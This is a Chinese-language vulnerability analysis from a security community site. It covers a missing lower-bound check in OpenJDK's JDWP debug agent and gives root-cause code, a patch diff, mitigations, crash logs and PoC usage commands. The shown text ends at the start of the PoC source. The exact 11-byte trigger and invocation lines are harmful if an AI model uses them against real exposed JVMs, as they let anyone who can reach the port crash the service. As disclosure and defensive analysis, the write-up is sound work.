---
title: OpenJDK JDWP 调试代理命令分发表越界索引漏洞分析与复现
url: https://xz.aliyun.com/news/93382
source: 先知安全技术社区
date: 2026-11-18
fetch_date: 2026-11-19T09:37:44.457410
---

# OpenJDK JDWP 调试代理命令分发表越界索引漏洞分析与复现

[先知社区](/)[文章](/news)[视频](/course)[众测](/vuln)[赛事](/ctf)[技能](/skills)[墨白](/mobai)[活动](/events)[名人堂](/hof)[积分商城](/points-mall)

[写文章](/write)

有用收藏打赏分享

# OpenJDK JDWP 调试代理命令分发表越界索引漏洞分析与复现

[![](/images/default-avatar.png)rockmelodies](/users/64659)·2026-11-18 11:32·11 分钟·92·北京·漏洞分析

本文分析OpenJDK JDWP调试代理debugDispatch\_getHandler函数缺失下界检查的越界索引漏洞，攻击者发送11字节恶意命令即可触发越界读取执行造成拒绝服务。

> 编号：JDK-8382537（厂商未分配 CVE）
> 报告日期：2026-11-17
> 状态更新（2026-11-18）：Oracle 2026-11 CSPU（17.0.21.1）**未修复本缺陷**——
> `jdk.jdwp.agent` 在本轮 105 文件差分中零改动，`debugDispatch_getHandler` 仍无下界检查。

## 产品介绍

JDWP（Java Debug Wire Protocol）是 JPDA 的传输层协议，由 OpenJDK 的
`jdk.jdwp.agent` 模块实现，分两个原生库：

* `libdt_socket.dylib`（Linux 上为 `.so`）：socket 传输，读写 11 字节协议头
* `libjdwp.dylib`：命令分发表与各命令处理函数

被调试 JVM 以调试模式启动后监听 TCP 端口，**协议本身不含任何认证**：任何能连上端口的
客户端，完成 14 字节明文握手 `JDWP-Handshake` 后即可下发命令，包括取类列表、读对象、
调方法、触发 GC、断点等。它广泛出现在开发、测试、CI、容器镜像与部分生产排障配置中。

协议包头为固定 11 字节：

```
offset 0  length  u4   整包长度（含头）
offset 4  id      u4   包序号
offset 8  flags   u1   0x00=命令 0x80=回复
offset 9  cmdSet  u1   命令集编号（有符号 jbyte）
offset 10 cmd     u1   命令编号（有符号 jbyte）
```

## 利用前置条件

1. 目标 JVM 以 `-agentlib:jdwp=transport=dt_socket,server=y,...` 启动（调试模式）；
2. 攻击者可访问该监听端口；
3. 无需任何凭据、无需用户交互、无需目标应用存在特定业务逻辑。

## 漏洞概述

| 项目 | 内容 |
| --- | --- |
| 漏洞名称 | OpenJDK JDWP 命令分发表越界索引导致远程控制流劫持 |
| 厂商编号 | JDK-8382537（无 CVE） |
| 公开日期 | 2026-04-20（报告）/ 2026-08-04（修复入库） |
| 影响组件 | `jdk.jdwp.agent` → `libjdwp`（`debugDispatch_getHandler`） |
| 漏洞类型 | 内存损坏 / 数组索引越界读 → 间接调用（CWE-129，兼 CWE-125） |
| 利用方式 | 远程，无需认证 |
| PoC 状态 | 已有，单包 11 字节确定性触发（见 §05） |
| CVSS 3.1 | **7.5** `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| 修复版本 | JDK 27；17u / 21u 尚未回移 |

---

## 01 漏洞影响范围

所有在 JDK 27 之前发布、且启用了 JDWP 的 OpenJDK 及下游发行版（Oracle JDK、Temurin、
Zulu、Corretto、各 Linux 发行版 openjdk 包）。

本报告实测矩阵（同一 11 字节输入，各版本独立进程）：

| 版本 | 来源 | 结果 |
| --- | --- | --- |
| 17.0.5 | Oracle JDK | 崩溃（SIGBUS/SEGV，rc=-6） |
| 17.0.21 | Temurin 17.0.21+9 | 崩溃，3/3 确定性 |
| 17.0.21.1-ea | Temurin 17.0.21.1+1-ea-beta | 崩溃（下一次 CSPU 构建亦未修复） |
| 18.0.2.1 | Oracle JDK | 崩溃 |
| 21.0.13 | Temurin 21.0.13+9 | 崩溃 |
| 25.0.5 | Temurin 25.0.5+8 | 崩溃 |

判定依据：`openjdk/jdk master` 已含修复，`fixVersion=27`；`jdk17u`、`jdk21u` 分支
在 2026-11-17 仍为未修复代码。

## 02 修复建议

**根本修复**：升级至 JDK 27 或更高版本；或等待 17u/21u 回移后升级到对应 update。

**手动回移**（`src/jdk.jdwp.agent/share/native/libjdwp/debugDispatch.c`，两处下界）：

```
-    if (cmdSetNum > JDWP_HIGHEST_COMMAND_SET) {
+    if (cmdSetNum < 0 || cmdSetNum > JDWP_HIGHEST_COMMAND_SET) {
         return NULL;
     }
...
-    if (cmdNum > cmd_set->num_cmds) {
+    if (cmdNum < 1 || cmdNum > cmd_set->num_cmds) {
         *cmdName_p = "<Invalid Command>";
         return NULL;
```

**临时缓解**（无法立即升级时）：

1. 生产环境禁止 JDWP 对外监听：`address=127.0.0.1:5005` 或 `address=*:5005` 均不可用于
   对外暴露的场景；容器内使用 `address=*:5005` 且不做端口映射同样是暴露。
2. 必须远程调试时，走 `ssh -L 5005:127.0.0.1:5005` 隧道，JDWP 只绑 localhost。
3. 在边界防火墙上禁止 5005/8000/其他自定义 JDWP 端口入向。
4. 排查历史暴露：JDWP 无认证无日志，暴露期间无法从应用日志判断是否被访问，
   应按"已被触碰"处理——检查 `hs_err_pid*.log`、异常重启记录。

## 03 漏洞描述

### 根因

`debugDispatch.c:94-118`：

```
CommandHandler
debugDispatch_getHandler(int cmdSetNum, int cmdNum, const char **cmdSetName_p, const char **cmdName_p)
{
    CommandSet *cmd_set;
    *cmdSetName_p = "<Invalid CommandSet>";
    *cmdName_p = "<Unkown Command>";

    if (cmdSetNum > JDWP_HIGHEST_COMMAND_SET) {      /* 只有上界 */
        return NULL;
    }

    cmd_set = cmdSetsArray[cmdSetNum];               /* cmdSetNum 为负 → 越界读 */
    if (cmd_set == NULL) {
      return NULL;
    }

    *cmdSetName_p = cmd_set->cmd_set_name;
    if (cmdNum > cmd_set->num_cmds) {                /* 只有上界 */
        *cmdName_p = "<Invalid Command>";
        return NULL;
    } else {
        *cmdName_p = cmd_set->cmds[cmdNum - 1].cmd_name;    /* cmdNum=0 → cmds[-1] */
        return cmd_set->cmds[cmdNum - 1].cmd_handler;       /* 越界读出的"函数指针" */
    }
}
```

三条独立成因，任一条都够：

1. **cmdSetNum 缺下界**：`cmdSet` 从包里读入 `jbyte`（有符号），`0x80..0xFF` 被符号扩展为
   负数，`-2 > 18` 为假，`cmdSetsArray[-2]` 读到数组之前的堆内存。
2. **cmdNum 缺下界**：`cmdNum=0` 通过 `0 > num_cmds` 检查，随后 `cmds[0 - 1]` 越界。
   `cmdNum=0xFF`（=-1）同理得 `cmds[-2]`。
3. **返回值未校验即调用**：`debugLoop.c:142` 取得 `func`，`:161` 直接
   `replyToSender = func(&in, &out);`，不判断该地址是否指向可执行代码。

### 攻击链

```
TCP connect → "JDWP-Handshake" → 11 字节命令包(cmdSet=1, cmd=0)
   → socketTransport_readPacket()  长度 11 合法，data_len=0，通过全部校验
   → debugLoop.c:142 debugDispatch_getHandler(1, 0, ...)
   → cmds[-1] 越过 VirtualMachine_Commands，落在相邻静态表 ThreadReference_Commands
   → 该表首地址被当作 handler 返回
   → debugLoop.c:161 func(&in,&out) 间接调用 → PC = ThreadReference_Commands+0x0
   → SIGBUS / SIGSEGV，进程终止
```

注意：传输层在这一步之前是**正确**的。`socketTransport_readPacket()` 校验了
`length` 与 `data_len < 0`，并限制了分配大小——问题完全在命令分发层的边界检查。

### 为什么"有检查"却仍然越界

上界检查让代码看起来是安全的，代码评审时极易通过。真正的触发点不是"过大的编号"，
而是"过小/为负的编号"，而编号来自网络且类型有符号，这两点叠加才构成缺陷。

### 稳定性

* 崩溃 3/3 确定性（同一输入、独立进程）。
* 信号在 SIGBUS(10) 与 SIGSEGV(11) 间抖动，`si_addr` 随 ASLR 变化——这符合"读到垃圾
  指针后跳转"，不是稳定的空指针解引用。

## 04 漏洞复现

### 环境

```
macOS 15.8.3 x86_64
Temurin 17.0.21+9（sha256 校验通过）
被调试端：任意长驻 Java 程序
```

### 启动被调试端

```
java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=127.0.0.1:5061 \
     -XX:ErrorFile=./hs_err_%p.log -cp . Target
```

### 执行 PoC

```
python3 poc_jdwp_oob.py 127.0.0.1 5061
```

### 实测输出

启动被调试端后执行 PoC，同一 11 字节包跑 3 次独立 JVM，3/3 确定性崩溃：

![](https://xzfile.aliyuncs.com/media/upload/picture/20261118113615-357426ac-e301-1.png "null")

`exit=-6` 是 VM 信号处理器捕获崩溃、写完 `hs_err` 后调用 `abort()` 的结果（信号 6 = SIGABRT），
原始信号是 `hs_err` 中记录的 SIGBUS。

目标进程随即终止，`hs_err_pid*.log`：

```
# A fatal error has been detected by the Java Runtime Environment:
#  SIGBUS (0xa) at pc=0x000000010be8e750, pid=18612, tid=27395
#
# JRE version: OpenJDK Runtime Environment Temurin-17.0.21+9 (17.0.21+9)
# Problematic frame:
# C  [libjdwp.dylib+0x38750]  ThreadReference_Commands+0x0

Native frames:
C  [libjdwp.dylib+0x38750]  ThreadReference_Commands+0x0
C  [libjdwp.dylib+0x249fc]  acceptThread+0x12c
V  [libjvm.dylib+0x6a91b4]  JvmtiAgentThread::call_start_function()+0x84
```

`Problematic frame` 直接指向**数据符号** `ThreadReference_Commands` 的 `+0x0`，这是
`cmds[-1]` 越过相邻静态表的指纹：越界读出的"函数指针"就是该表起始地址，被当作代码调用。

### 影响范围实测

同一 11 字节包对公司/发行版各版本逐一测试，6/6 全部崩溃：

![](https://xzfile.aliyuncs.com/media/upload/picture/20261118113616-35ceee90-e301-1.png "null")

注意 `17.0.21.1-ea`（下一次 CSPU 的预构建）同样崩溃，说明该缺陷不在本次补丁范围内。

### 附带发现：`redefineClasses` 整数溢出

`classCount` 只校验 `== 0`，分配尺寸按 `int` 乘法计算可回绕，随后 `memset`
用的是 64 位长度。`classCount = 0x20000001` 时分配 24 字节、零写 12.8 GB：

![](https://xzfile.aliyuncs.com/media/upload/picture/20261118113616-361de6f4-e301-1.png "null")

多次运行全部 `DEAD (exit=-6)`，而崩溃点在不同运行中落在 `_platform_bzero`（memset 本身）、
`PeriodicTask::real_time_tick`、`G1ServiceThread::run_task`、`pthread_mutex_unlock`，
有时甚至来不及写出 `hs_err`——说明零写已越过 24 字节缓冲区、抹掉了相邻 VM 结构。
写入值恒为 0、起始位置随堆布局，故仍属 DoS：不能控制写什么、写到哪里。

`cmdSet=0xFE`（负 cmdSet）路径依赖堆布局：本机 `cmdSetsArray[-2]` 恰为 NULL，
返回 `NOT_IMPLEMENTED` 而未崩溃，故未列为确定性结论。

### 能否升级为 RCE

**不能。** 可达的越界索引被限制在 `[-129, -1]`（`cmd > num_cmds` 会先返回 NULL），
落点全部是 `libjdwp` 静态 `__DATA` 中相邻 `CommandSet` 结构体的 `cmds` 字段——
一个指向静态表本身的数据指针，攻击者无法写入。`__DATA` 为 rw-（无执行位），
调用即取指失败（SIGBUS）。逐条排除与 18 个命令集的运行时落点表见
`reports/RCE可行性分析.md`。

## 05 漏洞利用代码

### 使用说明

| 参数 | 必填 | 默认 | 说明 |
| --- | --- | --- | --- |
| `HOST` | 是 | — | 目标 JDWP 监听地址 |
| `PORT` | 是 | — | 目标 JDWP 端口 |
| `cmdSet` | 否 | `0x01` | 命令集，`0x01`=VirtualMachine（合法） |
| `cmd` | 否 | `0x00` | 命令号，0 即触发 `cmds[-1]` |

```
# 默认：确定性崩溃
python3 poc_jdwp_oob.py 127.0.0.1 5005

# 变体：cmd = 0xFF（=-1）→ cmds[-2]
python3 poc_jdwp_oob.py 127.0.0.1 5005 0x01 0xFF

# 变体：负 cmdSet（依赖堆布局，不保证崩溃）
python3 poc_jdwp_oob.py 127.0.0.1 5005 0xFE 0x01
```

单包即可，无需保持连接、无需后续交互。

### 完整源码 `poc_jdwp_oob.py`

```
#!/usr/bin/env python3
"""JDK-8382537 PoC - libjdwp command-dispatch out-of-bounds index.

Sends ONE 11-byte JDWP command packet whose command number is 0 (or -1), so
debugDispatch_getHandler() computes cmds[cmdNum - 1] == cmds[-1], reads a
"handler" pointer out of the adjacent static table and the debug agent calls it....